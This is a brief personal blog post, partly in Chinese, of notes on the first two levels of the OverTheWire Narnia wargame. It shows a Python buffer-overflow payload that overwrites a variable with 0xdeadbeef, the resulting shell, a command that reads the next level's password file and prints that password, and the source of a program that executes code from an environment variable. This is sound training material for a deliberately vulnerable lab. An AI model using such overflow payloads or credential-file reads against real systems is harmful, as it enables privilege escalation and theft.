---
layout: default
title: overthewire_wargames_notes_narnia
categories:
- C++
tags:
- C++
---
//Description:

//Create Date: 2020-02-25 15:42:55

//Author: channy

# overthewire_wargames_notes_narnia

[address](https://overthewire.org/wargames/narnia/)

> ssh -p2226 narnia0@narnia.labs.overthewire.org

## 1. 

```
narnia0@narnia:/narnia$ ls -lrht
total 108K
-r-sr-x--- 1 narnia1 narnia0 7.3K Aug 26 22:35 narnia0
-r--r----- 1 narnia0 narnia0 1.3K Aug 26 22:35 narnia0.c
-r-sr-x--- 1 narnia2 narnia1 7.2K Aug 26 22:35 narnia1
-r--r----- 1 narnia1 narnia1 1021 Aug 26 22:35 narnia1.c
-r-sr-x--- 1 narnia3 narnia2 5.0K Aug 26 22:35 narnia2
-r--r----- 1 narnia2 narnia2 1022 Aug 26 22:35 narnia2.c
-r-sr-x--- 1 narnia4 narnia3 5.6K Aug 26 22:35 narnia3
-r--r----- 1 narnia3 narnia3 1.7K Aug 26 22:35 narnia3.c
-r-sr-x--- 1 narnia5 narnia4 5.2K Aug 26 22:35 narnia4
-r--r----- 1 narnia4 narnia4 1.1K Aug 26 22:35 narnia4.c
-r-sr-x--- 1 narnia6 narnia5 5.5K Aug 26 22:35 narnia5
-r--r----- 1 narnia5 narnia5 1.3K Aug 26 22:35 narnia5.c
-r-sr-x--- 1 narnia7 narnia6 5.9K Aug 26 22:35 narnia6
-r--r----- 1 narnia6 narnia6 1.6K Aug 26 22:35 narnia6.c
-r-sr-x--- 1 narnia8 narnia7 6.4K Aug 26 22:35 narnia7
-r--r----- 1 narnia7 narnia7 2.0K Aug 26 22:35 narnia7.c
-r-sr-x--- 1 narnia9 narnia8 5.1K Aug 26 22:35 narnia8
-r--r----- 1 narnia8 narnia8 1.3K Aug 26 22:35 narnia8.c
```

c语言的编译器在分配内存时，不只是按照变量的定义顺序来分配的，而且还参考了变量的类型。

这个程序读入24个字节的字符串放到BUF里，  多余的4个字节就会覆盖VAL，   进而改变VAL的值

```
narnia0@narnia:/narnia$ python -c 'print "a"*20 + "\xef\xbe\xad\xde" + "\x80" '
aaaaaaaaaaaaaaaaaaaaﾭހ
narnia0@narnia:/narnia$ ./narnia0 
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: aaaaaaaaaaaaaaaaaaaaﾭހ
buf: aaaaaaaaaaaaaaaaaaaaﾭ�
val: 0xdeadbeef
$ whoami
narnia1
$ cat /etc/narnia_pass/narnia1
efeidiedae

//但是用python3就不行哦～
narnia0@narnia:/narnia$ python3 -c 'print("a"*20 + "\xef\xbe\xad\xde" + "\x80")'
aaaaaaaaaaaaaaaaaaaaï¾­Þ
```

## 2.

```narnia1.c
#include <stdio.h>
 
int main(){
    int (*ret)();
 
    if(getenv("EGG")==NULL){
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1);
    }   
 
    printf("Trying to execute EGG!\n");
    ret = getenv("EGG");
    ret();
 
    return 0;
}
```

从入门到放弃。。。

[back](/)

